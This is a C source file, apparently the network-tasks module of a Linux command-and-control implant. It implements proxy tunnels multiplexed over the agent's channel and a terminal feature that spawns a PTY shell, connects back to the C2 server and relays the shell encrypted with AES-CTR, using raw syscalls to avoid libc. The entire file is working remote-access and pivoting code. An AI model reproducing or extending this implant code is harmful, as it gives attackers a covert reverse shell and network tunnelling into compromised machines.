/// tasks_net.c -- Network commands for Linux agent (tunnel/terminal)
/// Tunnels use the proxyfire MUX model (non-blocking, no threads, no separate connection).
/// Terminals still use the thread+separate-connection model (Phase 2 migration).

#include "tasks_net.h"
#include "proxyfire.h"
#include "jobs.h"
#include "crt.h"
#include "crypt.h"
#include "types.h"

#ifdef BUILD_SO
#include "elf_resolve.h"
#else
#ifdef ARCH_X86_64
#include "syscalls_x64.h"
#endif
#ifdef ARCH_AARCH64
#include "syscalls_aarch64.h"
#endif
#endif

// ── Constants ──

#ifndef O_RDONLY
#define O_RDONLY   0
#define O_WRONLY   1
#define O_RDWR     2
#define O_NONBLOCK 04000
#define O_NOCTTY   0400
#endif
#ifndef F_SETFL
#define F_SETFL    4
#define F_GETFL    3
#endif
#ifndef WNOHANG
#define WNOHANG    1
#endif
#ifndef AF_INET
#define AF_INET      2
#define SOCK_STREAM  1
#define SOL_SOCKET   1
#define SO_ERROR     4
#endif
#ifndef TIOCSWINSZ
#define TIOCSWINSZ   0x5414
#define TIOCSCTTY    0x540E
#endif
#ifndef EINPROGRESS
#define EINPROGRESS  115
#endif

struct linux_winsize {
    unsigned short ws_row;
    unsigned short ws_col;
    unsigned short ws_xpixel;
    unsigned short ws_ypixel;
};

// ── Abstraction macros ──

#ifdef BUILD_SO
#define F_open(p,f,m)         R_open(p,f,m)
#define F_close(fd)           R_close(fd)
#define F_read(fd,b,n)        R_read(fd,b,n)
#define F_write(fd,b,n)       R_write(fd,b,n)
#define F_fork()              R_fork()
#define F_setsid()            R_setsid()
#define F_dup2(o,n)           R_dup2(o,n)
#define F_execve(p,a,e)       R_execve(p,a,e)
#define F_kill(p,s)           R_kill(p,s)
#define F_waitpid(p,s,o)      R_waitpid(p,s,o)
#define F_exit(s)             R_exit(s)
#define F_socket(d,t,p)       R_socket(d,t,p)
#define F_connect(s,a,l)      R_connect(s,a,l)
#define F_select(n,r,w,e,t)   R_select(n,r,w,e,t)
#define F_fcntl(fd,c,a)       R_fcntl(fd,c,a)
#define F_getsockopt(s,l,o,v,n) R_getsockopt(s,l,o,v,n)
#define F_ioctl(fd,r,a)       R_ioctl(fd,r,a)
#define F_posix_openpt(f)     R_posix_openpt(f)
#define F_grantpt(fd)         R_grantpt(fd)
#define F_unlockpt(fd)        R_unlockpt(fd)
#define F_ptsname(fd)         R_ptsname(fd)
#define F_setenv(k,v,o)       R_setenv(k,v,o)
#else
#define F_open(p,f,m)         sys_open(p,f,m)
#define F_close(fd)           sys_close(fd)
#define F_read(fd,b,n)        sys_read(fd,b,n)
#define F_write(fd,b,n)       sys_write(fd,b,n)
#define F_fork()              sys_fork()
#define F_setsid()            sys_setsid()
#define F_dup2(o,n)           sys_dup2(o,n)
#define F_execve(p,a,e)       sys_execve(p,a,e)
#define F_kill(p,s)           sys_kill(p,s)
#define F_waitpid(p,s,o)      sys_wait4(p,s,o,(void*)0)
#define F_exit(s)             sys_exit_group(s)
#define F_socket(d,t,p)       sys_socket(d,t,p)
#define F_connect(s,a,l)      sys_connect(s,a,l)
#define F_fcntl(fd,c,a)       sys_fcntl(fd,c,a)
#define F_getsockopt(s,l,o,v,n) sys_getsockopt(s,l,o,v,n)
#define F_ioctl(fd,r,a)       sys_ioctl(fd,r,(unsigned long)(a))
#endif

// ── Helpers ──

static void write_error(mp_writer_t *w, const char *msg) {
    mp_write_map(w, 1);
    mp_write_kv_str(w, "error", msg);
}

// fd_set operations (manual for -nostdlib)
typedef struct {
    unsigned long fds_bits[1024 / (8 * sizeof(unsigned long))];
} linux_fd_set;

static void fd_zero(linux_fd_set *s) {
    ax_memset(s, 0, sizeof(linux_fd_set));
}

static void fd_set_bit(int fd, linux_fd_set *s) {
    s->fds_bits[fd / (8 * sizeof(unsigned long))] |= (1UL << (fd % (8 * sizeof(unsigned long))));
}

static int fd_is_set(int fd, linux_fd_set *s) {
    return (s->fds_bits[fd / (8 * sizeof(unsigned long))] >> (fd % (8 * sizeof(unsigned long)))) & 1;
}

// Select wrapper — uses pselect6 on raw syscalls, select on SO mode
static int net_select(int nfds, linux_fd_set *rfds, linux_fd_set *wfds, int timeout_ms) {
#ifdef BUILD_SO
    // For SO mode, convert to struct timeval and use R_select
    struct { long tv_sec; long tv_usec; } tv;
    tv.tv_sec = timeout_ms / 1000;
    tv.tv_usec = (timeout_ms % 1000) * 1000;
    return F_select(nfds, rfds, wfds, (void*)0, &tv);
#else
    // Static mode: use pselect6 with timespec
    struct linux_timespec ts;
    ts.tv_sec = timeout_ms / 1000;
    ts.tv_nsec = (long)(timeout_ms % 1000) * 1000000L;
    return sys_pselect6(nfds, rfds, wfds, (void*)0, &ts, (void*)0);
#endif
}

// Parse channel_id from tunnel command params
static int parse_channel_id(const uint8_t *data, uint32_t data_len) {
    mp_reader_t r;
    mp_reader_init(&r, data, data_len);
    uint32_t mc;
    if (mp_read_map(&r, &mc) != 0) return -1;

    for (uint32_t i = 0; i < mc; i++) {
        const char *k; uint32_t kl;
        if (mp_read_str(&r, &k, &kl) != 0) return -1;
        if (kl == 10 && ax_memcmp(k, "channel_id", 10) == 0) {
            uint64_t v;
            if (mp_read_uint(&r, &v) == 0) return (int)v;
            int64_t sv;
            if (mp_read_int(&r, &sv) == 0) return (int)sv;
            return -1;
        }
        mp_skip(&r);
    }
    return -1;
}

// ── Tunnel (MUX model via proxyfire) ──
// No threads, no separate connection. Data flows in main channel.

int task_tunnel_start(const uint8_t *data, uint32_t data_len, mp_writer_t *w) {
    mp_reader_t r;
    mp_reader_init(&r, data, data_len);
    uint32_t mc;
    if (mp_read_map(&r, &mc) != 0) { write_error(w, "bad params"); return 0; }

    char proto[8] = {0};
    int channel_id = -1;
    char address[256] = {0};

    for (uint32_t i = 0; i < mc; i++) {
        const char *k; uint32_t kl;
        if (mp_read_str(&r, &k, &kl) != 0) break;
        if (kl == 5 && ax_memcmp(k, "proto", 5) == 0) {
            const char *v; uint32_t vl;
            mp_read_str(&r, &v, &vl);
            if (vl < sizeof(proto)) { ax_memcpy(proto, v, vl); proto[vl] = '\0'; }
        } else if (kl == 10 && ax_memcmp(k, "channel_id", 10) == 0) {
            uint64_t v;
            if (mp_read_uint(&r, &v) == 0) channel_id = (int)v;
            else {
                int64_t sv;
                if (mp_read_int(&r, &sv) == 0) channel_id = (int)sv;
            }
        } else if (kl == 7 && ax_memcmp(k, "address", 7) == 0) {
            const char *v; uint32_t vl;
            mp_read_str(&r, &v, &vl);
            if (vl < sizeof(address)) { ax_memcpy(address, v, vl); address[vl] = '\0'; }
        } else {
            mp_skip(&r);
        }
    }

    if (proto[0] == '\0' || channel_id < 0 || address[0] == '\0') {
        write_error(w, "missing tunnel params");
        return 0;
    }

    job_context_t *ctx = &g_job_ctx;

    // Allocate tunnel slot
    jobs_mutex_lock(&ctx->tunnels_mutex);
    int idx = -1;
    for (int i = 0; i < MAX_TUNNELS; i++) {
        if (!ctx->tunnels[i].active) {
            idx = i;
            ax_memset(&ctx->tunnels[i], 0, sizeof(tunnel_entry_t));
            ctx->tunnels[i].client_fd = -1;
            ctx->tunnels[i].channel_id = channel_id;
            ctx->tunnels[i].active = 1;
            break;
        }
    }
    jobs_mutex_unlock(&ctx->tunnels_mutex);

    if (idx < 0) { write_error(w, "max tunnels reached"); return 0; }

    // Start async connect (non-blocking, polled by process_tunnels)
    if (proxy_connect_tcp(idx, address) != 0) {
        // Immediate failure — status will be sent by process_tunnels (CloseProxy stage)
    }

    mp_write_map(w, 1);
    mp_write_kv_str(w, "status", "tunnel starting");
    return 0;
}

int task_tunnel_write(const uint8_t *data, uint32_t data_len, mp_writer_t *w) {
    mp_reader_t r;
    mp_reader_init(&r, data, data_len);
    uint32_t mc;
    if (mp_read_map(&r, &mc) != 0) { write_error(w, "bad params"); return 0; }

    int channel_id = -1;
    const uint8_t *payload = (const uint8_t *)0;
    uint32_t payload_len = 0;

    for (uint32_t i = 0; i < mc; i++) {
        const char *k; uint32_t kl;
        if (mp_read_str(&r, &k, &kl) != 0) break;
        if (kl == 10 && ax_memcmp(k, "channel_id", 10) == 0) {
            uint64_t v;
            if (mp_read_uint(&r, &v) == 0) channel_id = (int)v;
            else {
                int64_t sv;
                if (mp_read_int(&r, &sv) == 0) channel_id = (int)sv;
            }
        } else if (kl == 4 && ax_memcmp(k, "data", 4) == 0) {
            mp_read_bin(&r, &payload, &payload_len);
        } else {
            mp_skip(&r);
        }
    }

    if (channel_id >= 0 && payload && payload_len > 0) {
        proxy_write_tcp(channel_id, payload, payload_len);
    }

    // No response for write commands — transparent
    mp_write_map(w, 0);
    return 0;
}

int task_tunnel_stop(const uint8_t *data, uint32_t data_len, mp_writer_t *w) {
    int ch_id = parse_channel_id(data, data_len);
    if (ch_id < 0) { write_error(w, "missing channel_id"); return 0; }

    proxy_close(ch_id);
    mp_write_map(w, 1);
    mp_write_kv_str(w, "status", "tunnel stopped");
    return 0;
}

int task_tunnel_pause(const uint8_t *data, uint32_t data_len, mp_writer_t *w) {
    int ch_id = parse_channel_id(data, data_len);
    if (ch_id < 0) { write_error(w, "missing channel_id"); return 0; }

    proxy_pause(ch_id);
    mp_write_map(w, 1);
    mp_write_kv_str(w, "status", "tunnel paused");
    return 0;
}

int task_tunnel_resume(const uint8_t *data, uint32_t data_len, mp_writer_t *w) {
    int ch_id = parse_channel_id(data, data_len);
    if (ch_id < 0) { write_error(w, "missing channel_id"); return 0; }

    proxy_resume(ch_id);
    mp_write_map(w, 1);
    mp_write_kv_str(w, "status", "tunnel resumed");
    return 0;
}

// ── Terminal ──
// Spawns thread -> opens PTY -> connects to C2 -> bidirectional AES-CTR relay

#define TERMINAL_BUF_SIZE  (32 * 1024)  // 32KB

// PTY helper for static mode (no posix_openpt)
#ifndef BUILD_SO
static int pty_open_master(void) {
    int fd = sys_open("/dev/ptmx", O_RDWR | O_NOCTTY, 0);
    if (fd < 0) return -1;

    // grantpt: write '0' to /dev/pts via ioctl TIOCSPTLCK
    int unlock = 0;
    sys_ioctl(fd, 0x40045431 /*TIOCSPTLCK*/, (unsigned long)&unlock);

    return fd;
}

static int pty_get_slave_num(int master_fd) {
    int pty_num = -1;
    sys_ioctl(master_fd, 0x80045430 /*TIOCGPTN*/, (unsigned long)&pty_num);
    return pty_num;
}
#endif

static int pty_fork_fn(const char *program, int width, int height,
                       int *master_fd, int *child_pid_out) {
    int master;

#ifdef BUILD_SO
    master = F_posix_openpt(O_RDWR | O_NOCTTY);
    if (master < 0) return -1;
    if (F_grantpt(master) != 0 || F_unlockpt(master) != 0) {
        F_close(master);
        return -1;
    }
    char *slave_name = F_ptsname(master);
    if (!slave_name) {
        F_close(master);
        return -1;
    }
#else
    master = pty_open_master();
    if (master < 0) return -1;
    int pty_num = pty_get_slave_num(master);
    if (pty_num < 0) {
        F_close(master);
        return -1;
    }
    // Build slave path: /dev/pts/N
    char slave_path[32];
    ax_strcpy(slave_path, "/dev/pts/");
    char num_buf[16];
    ax_itoa(pty_num, num_buf, 10);
    ax_strcat(slave_path, num_buf);
    char *slave_name = slave_path;
#endif

    int pid = F_fork();
    if (pid < 0) {
        F_close(master);
        return -1;
    }

    if (pid == 0) {
        // Child
        F_close(master);
        F_setsid();

        int slave = F_open(slave_name, O_RDWR, 0);
        if (slave < 0) F_exit(1);

        // Set terminal size
        struct linux_winsize ws;
        ws.ws_col = (unsigned short)width;
        ws.ws_row = (unsigned short)height;
        ws.ws_xpixel = 0;
        ws.ws_ypixel = 0;
        F_ioctl(slave, TIOCSWINSZ, &ws);

        // Set as controlling terminal
        F_ioctl(slave, TIOCSCTTY, 0);

        F_dup2(slave, 0);
        F_dup2(slave, 1);
        F_dup2(slave, 2);
        if (slave > 2) F_close(slave);

#ifdef BUILD_SO
        F_setenv("TERM", "xterm-256color", 1);
#endif

        char *argv_term[] = { (char*)program, (char*)0 };
        F_execve(program, argv_term, (char*const*)0);
        F_exit(1);
    }

    // Parent
    *master_fd = master;
    *child_pid_out = pid;
    return 0;
}

typedef struct {
    int  terminal_idx;
    int  term_id;
    char program[256];
    int  width;
    int  height;
} terminal_args_t;

static void *terminal_thread(void *arg) {
    terminal_args_t *targs = (terminal_args_t*)arg;
    job_context_t *ctx = &g_job_ctx;

    jobs_mutex_lock(&ctx->terminals_mutex);
    terminal_entry_t *term = &ctx->terminals[targs->terminal_idx];
    jobs_mutex_unlock(&ctx->terminals_mutex);

    // Create PTY
    int alive = 1;
    char status_msg[256] = {0};

    if (pty_fork_fn(targs->program, targs->width, targs->height,
                    &term->pty_master, &term->child_pid) != 0) {
        alive = 0;
        ax_strcpy(status_msg, "PTY creation failed");
    }

    // Open connection to C2
    if (jobs_open_connection(ctx, &term->srv_conn) != 0) {
        if (term->pty_master >= 0) F_close(term->pty_master);
        if (term->child_pid > 0) F_kill(term->child_pid, 9);
        term->active = 0;
        ax_free(targs);
        return (void*)0;
    }

    // Generate per-terminal AES keys
    uint8_t term_key[16], term_iv[16];
    ax_random_bytes(term_key, 16);
    ax_random_bytes(term_iv, 16);

    // Send TermPack init
    mp_writer_t pack_w;
    mp_writer_init(&pack_w, 256);
    mp_write_map(&pack_w, 6);
    mp_write_kv_uint(&pack_w, "id", ctx->agent_id);
    mp_write_kv_int(&pack_w, "term_id", targs->term_id);
    mp_write_kv_bin(&pack_w, "key", term_key, 16);
    mp_write_kv_bin(&pack_w, "iv", term_iv, 16);
    mp_write_kv_bool(&pack_w, "alive", alive ? true : false);
    mp_write_kv_str(&pack_w, "status", status_msg);

    if (jobs_send_init(ctx, &term->srv_conn, JOB_TERMINAL,
                       pack_w.buf.data, (uint32_t)pack_w.buf.len) != 0) {
        mp_writer_free(&pack_w);
        if (term->pty_master >= 0) F_close(term->pty_master);
        if (term->child_pid > 0) F_kill(term->child_pid, 9);
        conn_close(&term->srv_conn);
        term->active = 0;
        ax_free(targs);
        return (void*)0;
    }
    mp_writer_free(&pack_w);

    if (!alive) {
        conn_close(&term->srv_conn);
        term->active = 0;
        ax_free(targs);
        return (void*)0;
    }

    // Set up AES-CTR streams
    aes128_ctr_ctx_t dec_ctx, enc_ctx;
    aes128_ctr_init(&dec_ctx, term_key, term_iv);
    aes128_ctr_init(&enc_ctx, term_key, term_iv);

    ax_memset(term_key, 0, 16);
    ax_memset(term_iv, 0, 16);

    // Bidirectional relay: PTY <-> C2 (AES-CTR encrypted)
    uint8_t *buf = (uint8_t*)ax_malloc(TERMINAL_BUF_SIZE);
    uint8_t *enc_buf = (uint8_t*)ax_malloc(TERMINAL_BUF_SIZE);

    int srv_fd = term->srv_conn.fd;
    int pty_fd = term->pty_master;

    while (!term->canceled) {
        linux_fd_set rfds;
        fd_zero(&rfds);
        fd_set_bit(srv_fd, &rfds);
        fd_set_bit(pty_fd, &rfds);

        int maxfd = srv_fd > pty_fd ? srv_fd : pty_fd;

        int sr = net_select(maxfd + 1, &rfds, (linux_fd_set*)0, 500);
        if (sr < 0) break;
        if (sr == 0) {
            // Check if child process is still running
            int wstatus;
            int wr = F_waitpid(term->child_pid, &wstatus, WNOHANG);
            if (wr > 0) break;
            continue;
        }

        // Server -> PTY (user input, decrypt)
        if (fd_is_set(srv_fd, &rfds)) {
            long n = F_read(srv_fd, buf, TERMINAL_BUF_SIZE);
            if (n <= 0) break;

            aes128_ctr_process(&dec_ctx, buf, enc_buf, (size_t)n);

            size_t written = 0;
            while (written < (size_t)n) {
                long wr = F_write(pty_fd, enc_buf + written, (size_t)n - written);
                if (wr <= 0) goto term_cleanup;
                written += (size_t)wr;
            }
        }

        // PTY -> Server (shell output, encrypt)
        if (fd_is_set(pty_fd, &rfds)) {
            long n = F_read(pty_fd, buf, TERMINAL_BUF_SIZE);
            if (n <= 0) break;

            aes128_ctr_process(&enc_ctx, buf, enc_buf, (size_t)n);

            size_t written = 0;
            while (written < (size_t)n) {
                long wr = F_write(srv_fd, enc_buf + written, (size_t)n - written);
                if (wr <= 0) goto term_cleanup;
                written += (size_t)wr;
            }
        }
    }

term_cleanup:
    ax_free(buf);
    ax_free(enc_buf);
    ax_memset(&dec_ctx, 0, sizeof(dec_ctx));
    ax_memset(&enc_ctx, 0, sizeof(enc_ctx));

    if (term->child_pid > 0) {
        F_kill(term->child_pid, 9);
        F_waitpid(term->child_pid, (void*)0, 0);
    }

    if (term->pty_master >= 0) F_close(term->pty_master);
    conn_close(&term->srv_conn);

    jobs_mutex_lock(&ctx->terminals_mutex);
    term->active = 0;
    jobs_mutex_unlock(&ctx->terminals_mutex);

    ax_free(targs);
    return (void*)0;
}

int task_terminal_start(const uint8_t *data, uint32_t data_len, mp_writer_t *w) {
    mp_reader_t r;
    mp_reader_init(&r, data, data_len);
    uint32_t mc;
    if (mp_read_map(&r, &mc) != 0) { write_error(w, "bad params"); return 0; }

    int term_id = -1;
    char program[256] = {0};
    int width = 80, height = 24;

    for (uint32_t i = 0; i < mc; i++) {
        const char *k; uint32_t kl;
        if (mp_read_str(&r, &k, &kl) != 0) break;
        if (kl == 7 && ax_memcmp(k, "term_id", 7) == 0) {
            uint64_t v;
            if (mp_read_uint(&r, &v) == 0) term_id = (int)v;
            else {
                int64_t sv;
                if (mp_read_int(&r, &sv) == 0) term_id = (int)sv;
            }
        } else if (kl == 7 && ax_memcmp(k, "program", 7) == 0) {
            const char *v; uint32_t vl;
            mp_read_str(&r, &v, &vl);
            if (vl < sizeof(program)) { ax_memcpy(program, v, vl); program[vl] = '\0'; }
        } else if (kl == 5 && ax_memcmp(k, "width", 5) == 0) {
            uint64_t v; mp_read_uint(&r, &v); width = (int)v;
        } else if (kl == 6 && ax_memcmp(k, "height", 6) == 0) {
            uint64_t v; mp_read_uint(&r, &v); height = (int)v;
        } else {
            mp_skip(&r);
        }
    }

    if (term_id < 0 || program[0] == '\0') {
        write_error(w, "missing terminal params");
        return 0;
    }

    job_context_t *ctx = &g_job_ctx;

    jobs_mutex_lock(&ctx->terminals_mutex);
    int idx = -1;
    for (int i = 0; i < MAX_TERMINALS; i++) {
        if (!ctx->terminals[i].active) {
            idx = i;
            ax_memset(&ctx->terminals[i], 0, sizeof(terminal_entry_t));
            ctx->terminals[i].srv_conn.fd = -1;
            ctx->terminals[i].pty_master = -1;
            ctx->terminals[i].child_pid = -1;
            ctx->terminals[i].term_id = term_id;
            ctx->terminals[i].active = 1;
            break;
        }
    }
    jobs_mutex_unlock(&ctx->terminals_mutex);

    if (idx < 0) { write_error(w, "max terminals reached"); return 0; }

    terminal_args_t *ta = (terminal_args_t*)ax_malloc(sizeof(terminal_args_t));
    ta->terminal_idx = idx;
    ta->term_id = term_id;
    ax_strncpy(ta->program, program, sizeof(ta->program) - 1);
    ta->width = width;
    ta->height = height;

    jobs_thread_create(&ctx->terminals[idx].thread, terminal_thread, ta);

    mp_write_map(w, 1);
    mp_write_kv_str(w, "status", "terminal starting");
    return 0;
}

static int parse_term_id(const uint8_t *data, uint32_t data_len) {
    mp_reader_t r;
    mp_reader_init(&r, data, data_len);
    uint32_t mc;
    if (mp_read_map(&r, &mc) != 0) return -1;

    for (uint32_t i = 0; i < mc; i++) {
        const char *k; uint32_t kl;
        if (mp_read_str(&r, &k, &kl) != 0) return -1;
        if (kl == 7 && ax_memcmp(k, "term_id", 7) == 0) {
            uint64_t v;
            if (mp_read_uint(&r, &v) == 0) return (int)v;
            int64_t sv;
            if (mp_read_int(&r, &sv) == 0) return (int)sv;
            return -1;
        }
        mp_skip(&r);
    }
    return -1;
}

int task_terminal_stop(const uint8_t *data, uint32_t data_len, mp_writer_t *w) {
    int tid = parse_term_id(data, data_len);
    if (tid < 0) { write_error(w, "missing term_id"); return 0; }

    int idx = terminals_find(&g_job_ctx, tid);
    if (idx < 0) { write_error(w, "terminal not found"); return 0; }

    g_job_ctx.terminals[idx].canceled = 1;
    mp_write_map(w, 1);
    mp_write_kv_str(w, "status", "terminal stopped");
    return 0;
}
